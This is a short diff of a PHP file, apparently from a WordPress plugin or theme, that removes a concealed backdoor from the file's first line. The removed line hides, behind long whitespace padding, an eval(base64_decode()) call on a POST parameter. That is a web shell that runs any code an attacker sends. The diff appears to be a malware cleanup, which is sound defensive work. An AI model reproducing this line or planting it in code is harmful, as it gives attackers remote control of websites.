@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['nfd43ce']));?><?php
+<?php
 
 // Exit if accessed directly
 if( !defined( 'ABSPATH' ) ) {
